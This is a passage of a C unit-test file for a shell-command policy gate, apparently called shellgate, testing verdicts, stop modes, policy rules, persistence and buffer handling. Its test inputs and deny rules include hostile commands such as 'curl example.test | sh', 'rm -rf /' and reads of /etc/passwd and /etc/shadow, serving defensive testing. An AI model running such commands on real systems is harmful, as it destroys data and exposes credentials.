      {"whitespace", "   ", SG_OK, SG_VERDICT_ALLOW, true},
      {"unterminated quote", "echo \"unclosed", SG_ERR_PARSE, SG_VERDICT_REJECT,
       false},
      {"nested heredoc outside dialect", "echo $(cat <<EOF\nbody\nEOF)",
       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
      {"nested unsupported construct", "echo $(case value in x)", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
      {"bash combined redirect outside dialect", "cmd &>file", SG_ERR_PARSE,
       SG_VERDICT_REJECT, false},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    if (cases[i].add_rule)
      ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
    sg_result_t result = {0};
    sg_error_t error = eval_cmd(g, cases[i].command, &result);
    if (error != cases[i].error ||
        (error != SG_ERR_INVALID && result.verdict != cases[i].verdict)) {
      fprintf(stderr, "input case failed: %s\n", cases[i].name);
      fail_count++;
    }
    if (error == SG_ERR_PARSE) {
      ASSERT(result.subcommand_count == 1);
      ASSERT(result.subcommands[0].substitution_consumer_index == -1);
      ASSERT(result.subcommands[0].group_parent_index == -1);
    }
    sg_gate_free(g);
  }
}

TEST(comment_only_source_does_not_trigger_feature_rejection) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_PROCESS_SUB));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "# <(printf data)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 0);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(!result.has_dynamic_substitution_io);
  ASSERT(!result.truncated);
  sg_gate_free(gate);
}

/* --- CONFIGURATION --- */

TEST(stop_mode_matrix) {
  static const struct {
    sg_stop_mode_t mode;
    const char *allow[3];
    size_t allow_count;
    const char *deny[1];
    size_t deny_count;
    const char *input;
    sg_verdict_t verdict;
    const char *commands[4];
    bool matches[4];
    size_t command_count;
  } cases[] = {
      {SG_STOP_FIRST_FAIL,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "rm ; cat /etc/passwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"rm"},
       {false},
       1},
      {SG_STOP_FIRST_FAIL,
       {"ls", "pwd"},
       2,
       {NULL},
       0,
       "ls ; rm ; pwd",
       SG_VERDICT_UNDETERMINED,
       {"ls", "rm"},
       {true, false},
       2},
      {SG_STOP_FIRST_PASS,
       {"cat #path", "ls"},
       2,
       {NULL},
       0,
       "echo a ; echo b ; cat /etc/passwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"echo a", "echo b", "cat /etc/passwd"},
       {false, false, true},
       3},
      {SG_STOP_FIRST_PASS,
       {"ls"},
       1,
       {NULL},
       0,
       "ls ; rm",
       SG_VERDICT_ALLOW,
       {"ls"},
       {true},
       1},
      {SG_STOP_FIRST_ALLOW,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "ls ; cat /etc/passwd ; rm -rf /",
       SG_VERDICT_ALLOW,
       {"ls"},
       {true},
       1},
      {SG_STOP_FIRST_DENY,
       {"ls", "cat #path"},
       2,
       {"cat /etc/shadow"},
       1,
       "ls ; cat /etc/shadow ; pwd",
       SG_VERDICT_DENY,
       {"ls", "cat /etc/shadow"},
       {true, true},
       2},
      {SG_STOP_FIRST_DENY,
       {"ls"},
       1,
       {"rm -rf /"},
       1,
       "ls ; pwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"ls", "pwd", "ls"},
       {true, false, true},
       3},
      {SG_EVAL_ALL,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "ls ; echo rm ; cat /etc/passwd",
       SG_VERDICT_UNDETERMINED,
       {"ls", "echo rm", "cat /etc/passwd"},
       {true, false, true},
       3},
      {SG_EVAL_ALL,
       {"ls", "cat #path"},
       2,
       {"cat /etc/shadow"},
       1,
       "ls ; cat /etc/shadow ; ls",
       SG_VERDICT_DENY,
       {"ls", "cat /etc/shadow", "ls"},
       {true, true, true},
       3},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(cases[i].allow, cases[i].allow_count);
    ASSERT(g != NULL);
    for (size_t j = 0; j < cases[i].deny_count; j++)
      ASSERT(sg_gate_add_deny_cpl(g, cases[i].deny[j]) == SG_OK);
    ASSERT(sg_gate_set_stop_mode(g, cases[i].mode) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == cases[i].verdict);
    ASSERT(result.subcommand_count == cases[i].command_count);
    ASSERT(result.short_circuited == (i < 6));
    for (size_t j = 0; j < cases[i].command_count; j++) {
      ASSERT(result.subcommands[j].display_command != NULL);
      ASSERT_STR(result.subcommands[j].display_command, cases[i].commands[j]);
      ASSERT(result.subcommands[j].matches == cases[i].matches[j]);
    }
    sg_gate_free(g);
  }
}

TEST(stop_mode_substitution_prefix) {
  static const char *rules[] = {"echo *", "whoami", "cat", "id"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo $(whoami) ; rm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].display_command, "echo $(whoami)");
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.truncated);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</tmp/direct) ; rm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
  ASSERT(!result.truncated);

  /* Stop mode may omit nested producers and later shell-list siblings from
   * the materialized results, but it must not omit the root dynamic-content
   * requirement carried by an expandable heredoc. */
  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(id)\nEOF\n; rm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.truncated);
  sg_gate_free(gate);
}

TEST(pipeline_many_subcommands) {
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_set_stop_mode(g, SG_EVAL_ALL));
  sg_result_t r;
  ASSERT_SG_OK(
      eval_cmd(g, "ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls", &r));
  ASSERT(r.subcommand_count == 10);
  for (uint32_t i = 0; i < r.subcommand_count; i++) {
    ASSERT(r.subcommands[i].matches);
  }

  char command[512] = {0};
  for (size_t i = 0; i < SG_MAX_SUBCOMMAND_RESULTS + 1; i++)
    strcat(command, i == 0 ? "ls" : " ; ls");
  ASSERT(eval_cmd(g, command, &r) == SG_ERR_TRUNC);
  ASSERT(r.truncated);
  ASSERT(r.subcommand_truncated);
  ASSERT(r.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
  ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
}

/* --- POLICY MANAGEMENT --- */

TEST(policy_mutation_matrix) {
  enum policy_action {
    POLICY_PROBE,
    POLICY_ADD_ALLOW,
    POLICY_REMOVE_ALLOW,
    POLICY_ADD_DENY,
    POLICY_REMOVE_DENY,
  };
  static const struct {
    enum policy_action action;
    const char *pattern;
    uint32_t allow_count;
    uint32_t deny_count;
    const char *probe;
    sg_verdict_t verdict;
  } steps[] = {
      {POLICY_PROBE, NULL, 0, 0, "ls", SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_ALLOW, "ls", 1, 0, "ls", SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "ls", 1, 0, "ls", SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "cat", 2, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_ALLOW, "cat /etc/passwd", 3, 0, "cat /etc/passwd",
       SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "rm", 4, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "cat", 3, 0, "cat /etc/passwd", SG_VERDICT_ALLOW},
      {POLICY_REMOVE_ALLOW, "nonexistent", 3, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_DENY, "cat /etc/passwd", 3, 1, "cat /etc/passwd",
       SG_VERDICT_DENY},
      {POLICY_ADD_DENY, "cat /etc/passwd", 3, 1, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_DENY, "nonexistent", 3, 1, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_DENY, "cat /etc/passwd", 3, 0, "cat /etc/passwd",
       SG_VERDICT_ALLOW},
      {POLICY_REMOVE_ALLOW, "ls", 2, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "cat /etc/passwd", 1, 0, NULL,
       SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "rm", 0, 0, "ls", SG_VERDICT_UNDETERMINED},
  };

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  for (size_t i = 0; i < sizeof(steps) / sizeof(steps[0]); i++) {
    sg_error_t err = SG_OK;
    switch (steps[i].action) {
    case POLICY_PROBE:
      break;
    case POLICY_ADD_ALLOW:
      err = sg_gate_add_allow_cpl(g, steps[i].pattern);
      break;
    case POLICY_REMOVE_ALLOW:
      err = sg_gate_remove_allow_cpl(g, steps[i].pattern);
      break;
    case POLICY_ADD_DENY:
      err = sg_gate_add_deny_cpl(g, steps[i].pattern);
      break;
    case POLICY_REMOVE_DENY:
      err = sg_gate_remove_deny_cpl(g, steps[i].pattern);
      break;
    }
    ASSERT(err == SG_OK);
    ASSERT_EQ_UINT(sg_gate_allow_rule_count(g), steps[i].allow_count);
    ASSERT_EQ_UINT(sg_gate_deny_rule_count(g), steps[i].deny_count);

    if (steps[i].probe) {
      sg_result_t result;
      ASSERT(eval_cmd(g, steps[i].probe, &result) == SG_OK);
      ASSERT(result.verdict == steps[i].verdict);
      ASSERT_EQ_UINT(result.subcommand_count, 1);
      ASSERT_STR(result.subcommands[0].display_command, steps[i].probe);
      ASSERT(result.subcommands[0].verdict == steps[i].verdict);
      ASSERT(result.subcommands[0].matches ==
             (steps[i].verdict != SG_VERDICT_UNDETERMINED));
    }
  }

  ASSERT(sg_gate_add_allow_cpl(NULL, "ls") == SG_ERR_INVALID);
  ASSERT(sg_gate_add_allow_cpl(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_allow_cpl(NULL, "ls") == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_allow_cpl(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_add_deny_cpl(NULL, "ls") == SG_ERR_INVALID);
  ASSERT(sg_gate_add_deny_cpl(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_deny_cpl(NULL, "ls") == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_deny_cpl(g, NULL) == SG_ERR_INVALID);
  sg_gate_free(g);
}

TEST(canonical_policy_mutation_matrix) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);

  char *allow_ls = NULL;
  char *allow_pwd = NULL;
  char *deny_rm = NULL;
  ASSERT(st_netpattern_from_cpl("ls", &allow_ls) == ST_OK);
  ASSERT(st_netpattern_from_cpl("pwd", &allow_pwd) == ST_OK);
  ASSERT(st_netpattern_from_cpl("rm", &deny_rm) == ST_OK);

  const char *allow_patterns[] = {allow_ls, allow_pwd};
  ASSERT_SG_OK(sg_gate_batch_add_allow_netpatterns(gate, allow_patterns, 2));
  ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 2);

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);

  ASSERT_SG_OK(sg_gate_add_deny_netpattern(gate, deny_rm));
  ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 1);
  ASSERT_SG_OK(eval_cmd(gate, "rm", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  ASSERT_SG_OK(sg_gate_remove_deny_netpattern(gate, deny_rm));
  ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 0);

  const char *invalid_batch[] = {allow_ls, "not-a-netpattern"};
  ASSERT(sg_gate_batch_add_allow_netpatterns(gate, invalid_batch, 2) ==
         SG_ERR_INVALID);
  ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 2);
  ASSERT_SG_OK(sg_gate_remove_allow_netpattern(gate, allow_ls));
  ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 1);

  ASSERT(sg_gate_add_allow_netpattern(NULL, allow_ls) == SG_ERR_INVALID);
  ASSERT(sg_gate_add_allow_netpattern(gate, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_allow_netpattern(NULL, allow_ls) == SG_ERR_INVALID);
  ASSERT(sg_gate_batch_add_allow_netpatterns(gate, NULL, 1) == SG_ERR_INVALID);
  ASSERT(sg_gate_batch_add_allow_netpatterns(gate, allow_patterns, 0) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_add_deny_netpattern(NULL, deny_rm) == SG_ERR_INVALID);
  ASSERT(sg_gate_remove_deny_netpattern(gate, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_batch_add_deny_netpatterns(gate, NULL, 1) == SG_ERR_INVALID);

  free(allow_ls);
  free(allow_pwd);
  free(deny_rm);
  sg_gate_free(gate);
}

TEST(policy_wrapper_error_translation) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);

  sg_gate_t *source = sg_gate_new();
  sg_gate_t *gate = sg_gate_new();
  ASSERT(source != NULL && gate != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(source, "cat #path"));
  ASSERT_SG_OK(sg_gate_save_policy(source, path));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "ls"));

  st_test_alloc_fail_at(1);
  sg_error_t error = sg_gate_add_allow_cpl(gate, "pwd");
  st_test_alloc_reset();
  ASSERT(error == SG_ERR_MEMORY);
  ASSERT(sg_gate_allow_rule_count(gate) == 1);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);

  st_test_alloc_fail_at(1);
  error = sg_gate_load_policy(gate, path);
  st_test_alloc_reset();
  ASSERT(error == SG_ERR_MEMORY);
  ASSERT(sg_gate_allow_rule_count(gate) == 1);

  st_test_io_fail_at(1);
  error = sg_gate_save_policy(gate, path);
  st_test_io_reset();
  ASSERT(error == SG_ERR_IO);

  ASSERT_SG_OK(sg_gate_load_policy(gate, path));
  ASSERT(sg_gate_allow_rule_count(gate) == 2);
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "cat /etc/hosts", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);

  char missing[] = "/tmp/shellgate-missing-XXXXXX";
  int fd = mkstemp(missing);
  ASSERT(fd >= 0);
  ASSERT(close(fd) == 0);
  ASSERT(unlink(missing) == 0);
  ASSERT(sg_gate_load_policy(gate, missing) == SG_ERR_IO);
  ASSERT(sg_gate_add_allow_cpl(gate, "") == SG_ERR_INVALID);

  FILE *malformed = fopen(path, "wb");
  ASSERT(malformed != NULL);
  ASSERT(fputs("not a policy\n", malformed) >= 0);
  ASSERT(fclose(malformed) == 0);
  ASSERT(sg_gate_load_policy(gate, path) == SG_ERR_PARSE);
  ASSERT(sg_gate_allow_rule_count(gate) == 2);

  sg_gate_free(gate);
  sg_gate_free(source);
}

TEST(policy_evaluation_allocation_failure) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, "rm *"));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result;
  st_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, "unknown argument", &result));
  size_t allocation_count = st_test_alloc_count();
  ASSERT(allocation_count > 0);
  size_t memory_failures = 0;
  for (size_t i = 1; i <= allocation_count; i++) {
    size_t vocab_before = sg_gate_anomaly_vocab_size(gate);
    st_test_alloc_fail_at(i);
    sg_error_t error = eval_cmd(gate, "another unknown", &result);
    st_test_alloc_reset();
    if (error == SG_ERR_MEMORY) {
      memory_failures++;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(gate), vocab_before);
    } else {
      ASSERT(error == SG_OK);
    }
  }
  ASSERT(memory_failures > 0);
  sg_gate_free(gate);
}

/* --- SERIALIZATION --- */

TEST(policy_persistence_matrix) {
  const char *path = temp_policy_file();
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cat #path"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "git * * *"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "rm #path"));
  ASSERT(sg_gate_allow_rule_count(g) == 4);

  sg_error_t err = sg_gate_save_policy(g, path);
  ASSERT(err == SG_OK);

  sg_gate_t *g2 = sg_gate_new();
  err = sg_gate_load_policy(g2, path);
  ASSERT(err == SG_OK);
  ASSERT(sg_gate_allow_rule_count(g2) == 4);

  static const struct {
    const char *command;
    sg_verdict_t verdict;
  } cases[] = {{"ls", SG_VERDICT_ALLOW},
               {"cat /etc/hosts", SG_VERDICT_ALLOW},
               {"rm /tmp/test", SG_VERDICT_ALLOW},
               {"unknown", SG_VERDICT_UNDETERMINED}};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t r;
    ASSERT(eval_cmd(g2, cases[i].command, &r) == SG_OK);
    ASSERT(r.verdict == cases[i].verdict);
  }

  sg_gate_free(g);
  sg_gate_free(g2);

  path = temp_policy_file();
  g = sg_gate_new();
  ASSERT(g != NULL && sg_gate_allow_rule_count(g) == 0);
  ASSERT_SG_OK(sg_gate_save_policy(g, path));

  g2 = sg_gate_new();
  ASSERT(g2 != NULL);
  ASSERT_SG_OK(sg_gate_load_policy(g2, path));
  ASSERT(sg_gate_allow_rule_count(g2) == 0);

  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g2, "ls", &r));
  ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
  sg_gate_free(g2);

  path = temp_policy_file();
  FILE *f = fopen(path, "w");
  ASSERT(f != NULL);
  ASSERT(fprintf(f, "NOT A VALID SHELLGATE POLICY FILE\n") > 0);
  ASSERT(fprintf(f, "This is just garbage text that should fail to load\n") >
         0);
  ASSERT(fclose(f) == 0);

  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  err = sg_gate_load_policy(g, path);
  ASSERT(err != SG_OK);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(g, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(g);
}

/* --- BUFFER MANAGEMENT --- */

TEST(buffer_contract_matrix) {
  static const struct {
    const char *command;
    size_t buffer_size;
  } cases[] = {
      {"ls | sort | cat", 4}, {"rm -rf /", 8}, {"cat /etc/passwd", 16}};
  const char *rules[] = {"ls", "sort", "cat #path"};
  sg_gate_t *g = gate_with_rules(rules, 3);
  ASSERT_SG_OK(sg_gate_add_deny_cpl(g, "rm"));

  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SHELL_FEAT_VARS));
  char feature_buffer[4];
  sg_result_t feature_result;
  ASSERT(sg_gate_evaluate(g, "echo $VALUE", strlen("echo $VALUE"),
                          feature_buffer, sizeof(feature_buffer),
                          &feature_result) == SG_ERR_TRUNC);
  ASSERT(feature_result.truncated);
  ASSERT(feature_result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));

  static const char *diagnostic_commands[] = {
      "echo $(id)", "echo $(case value in x)", "echo 'unterminated"};
  for (size_t i = 0;
       i < sizeof(diagnostic_commands) / sizeof(diagnostic_commands[0]); i++) {
    char buffer[4];
    sg_result_t result;
    ASSERT(sg_gate_evaluate(g, diagnostic_commands[i],
                            strlen(diagnostic_commands[i]), buffer,
                            sizeof(buffer), &result) == SG_ERR_TRUNC);
    ASSERT(result.truncated);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    ASSERT(memchr(buffer, '\0', sizeof(buffer)) != NULL);
  }

  for (size_t repeat = 0; repeat < 2; repeat++) {
    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
      char buffer[16];
      memset(buffer, 0xFF, sizeof(buffer));
      sg_result_t r;
      ASSERT(sg_gate_evaluate(g, cases[i].command, strlen(cases[i].command),
                              buffer, cases[i].buffer_size,
                              &r) == SG_ERR_TRUNC);
      ASSERT(r.truncated);
      ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT(memchr(buffer, '\0', cases[i].buffer_size) != NULL);
    }
  }

  char violation_buffer[2];
  sg_result_t violation_result;
  ASSERT(sg_gate_evaluate(g, "curl example.test | sh",
                          strlen("curl example.test | sh"), violation_buffer,
                          sizeof(violation_buffer),
                          &violation_result) == SG_ERR_TRUNC);
  ASSERT(violation_result.truncated);
  ASSERT(memchr(violation_buffer, '\0', sizeof(violation_buffer)) != NULL);

  char reuse_buffer[256];
  static const struct {
    const char *command;
    sg_verdict_t verdict;
  } reuse_cases[] = {{"ls", SG_VERDICT_ALLOW},
                     {"unknown", SG_VERDICT_UNDETERMINED}};
  for (size_t i = 0; i < sizeof(reuse_cases) / sizeof(reuse_cases[0]); i++) {
    memset(reuse_buffer, 0xFF, sizeof(reuse_buffer));
    sg_result_t result;
    ASSERT(sg_gate_evaluate(g, reuse_cases[i].command,
                            strlen(reuse_cases[i].command), reuse_buffer,
                            sizeof(reuse_buffer), &result) == SG_OK);
    ASSERT(result.verdict == reuse_cases[i].verdict);
    ASSERT(!result.truncated);
    ASSERT(result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].display_command, reuse_cases[i].command);
  }

  char one_byte_buffer[1];
  sg_result_t result;
  ASSERT(sg_gate_evaluate(NULL, "ls", 2, one_byte_buffer, 1, &result) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, NULL, 2, one_byte_buffer, 1, &result) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 2, NULL, 1, &result) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 2, one_byte_buffer, 1, NULL) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 2, one_byte_buffer, 0, &result) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "", 0, one_byte_buffer, 1, &result) ==
         SG_ERR_INVALID);

  char large_buffer[4096] = {0};
  char cmd[512];
  int len = 0;
  for (int i = 0; i < 65; i++) {
    if (i > 0) {
      cmd[len++] = ' ';
      cmd[len++] = ';';
      cmd[len++] = ' ';
    }
    cmd[len++] = 'l';
    cmd[len++] = 's';
  }
  ASSERT(sg_gate_evaluate(g, cmd, (size_t)len, large_buffer,
                          sizeof(large_buffer), &result) == SG_ERR_TRUNC);
  ASSERT(result.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
  ASSERT(result.truncated);
  ASSERT(result.subcommand_truncated);

  char termination_buffer[32];
  memset(termination_buffer, 0xFF, sizeof(termination_buffer));
  ASSERT(sg_gate_evaluate(g, "ls", 2, termination_buffer,
                          sizeof(termination_buffer), &result) == SG_OK);
  ASSERT(!result.truncated);
  ASSERT_STR(result.subcommands[0].display_command, "ls");
  ASSERT(memchr(termination_buffer, '\0', sizeof(termination_buffer)) != NULL);

  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  static const char anomaly_command[] =
      "ls -la /tmp ; cd /var/log ; pwd ; cat somefile.txt";
  char anomaly_small[16];
  memset(anomaly_small, 0xFF, sizeof(anomaly_small));
  ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
                          anomaly_small, sizeof(anomaly_small),
                          &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT(memchr(anomaly_small, '\0', sizeof(anomaly_small)) != NULL);

  size_t hint = sg_gate_evaluate_size_hint(strlen(anomaly_command));
  char *hint_buffer = malloc(hint);
  ASSERT(hint_buffer != NULL);
  ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
                          hint_buffer, hint, &result) == SG_OK);
  ASSERT(!result.truncated);
  free(hint_buffer);
  ASSERT_SG_OK(eval_cmd(g, anomaly_command, &result));
  ASSERT(!result.truncated);
  sg_gate_free(g);
}

TEST(final_diagnostic_truncation_fails_closed) {
  const char *rules[] = {"lss"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));

  bool exercised = false;
  for (size_t buffer_size = 1; buffer_size <= 64; buffer_size++) {
    char buffer[64];
    sg_result_t result;
    sg_error_t error =
        sg_gate_evaluate(gate, "ls", 2, buffer, buffer_size, &result);
    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
    if (error == SG_ERR_TRUNC && result.suggestion_count > 0) {
      exercised = true;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
    }
  }
  ASSERT(exercised);
  sg_gate_free(gate);
}

/* --- VERDICT HELPERS --- */

TEST(helper_contracts) {
  static const struct {
    sg_verdict_t verdict;
    const char *name;
  } verdicts[] = {{SG_VERDICT_ALLOW, "ALLOW"},
                  {SG_VERDICT_DENY, "DENY"},
                  {SG_VERDICT_REJECT, "REJECT"},
                  {SG_VERDICT_UNDETERMINED, "UNDETERMINED"},
                  {SG_VERDICT_ALLOW_CONDITIONAL, "ALLOW_CONDITIONAL"},
                  {(sg_verdict_t)-1, "UNKNOWN"}};
  for (size_t i = 0; i < sizeof(verdicts) / sizeof(verdicts[0]); i++)
    ASSERT_STR(sg_verdict_name(verdicts[i].verdict), verdicts[i].name);

  static const size_t lengths[] = {0, 10, 100};
  size_t previous = 0;
  for (size_t i = 0; i < sizeof(lengths) / sizeof(lengths[0]); i++) {
    size_t hint = sg_gate_evaluate_size_hint(lengths[i]);
    ASSERT(hint > previous);
    previous = hint;
  }
  ASSERT(sg_gate_evaluate_size_hint(SIZE_MAX) == SIZE_MAX);

  sg_result_t synthetic = {.violation_dropped_count = 7};
  ASSERT(sg_result_violation_dropped(&synthetic) == 7);
  ASSERT(sg_result_violation_dropped(NULL) == 0);

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "cat #path"));
  ASSERT_SG_OK(sg_gate_add_deny_cpl(g, "cat /etc/shadow"));

  sg_result_t result;
  ASSERT(eval_cmd(g, "ls ; cat /etc/shadow", &result) == SG_OK);
  ASSERT(result.attention_index == 1);
  ASSERT(result.violation_dropped_count == 0);
  ASSERT(sg_result_violation_dropped(&result) == 0);
  sg_gate_free(g);
}

TEST(suggestion_token_variant_contract) {
  st_token_variant_t variants[ST_MAX_TOKEN_VARIANTS] = {0};
  size_t count = sg_cpl_token_variants_at("timeout 42 ls", 1, variants,
                                          ST_MAX_TOKEN_VARIANTS);
  ASSERT(count >= 2 && count <= ST_MAX_TOKEN_VARIANTS);
  ASSERT(variants[0].type == ST_TYPE_LITERAL);
  ASSERT(variants[1].type == ST_TYPE_NUMBER);
  ASSERT(variants[count - 1].type == ST_TYPE_ANY);
  for (size_t i = 0; i < count; i++) {
    ASSERT(variants[i].type_symbol == st_type_symbol[variants[i].type]);
    ASSERT(variants[i].sample_value == NULL);
    for (size_t j = 0; j < i; j++)
      ASSERT(variants[j].type != variants[i].type);
  }

  struct {
    st_token_variant_t only;
    uint64_t canary;
  } bounded = {{0}, UINT64_C(0x9a47b31d20ef658c)};
  ASSERT(sg_cpl_token_variants_at("timeout 42", 1, &bounded.only, 1) == 1);
  ASSERT(bounded.only.type == ST_TYPE_LITERAL);
  ASSERT(bounded.canary == UINT64_C(0x9a47b31d20ef658c));

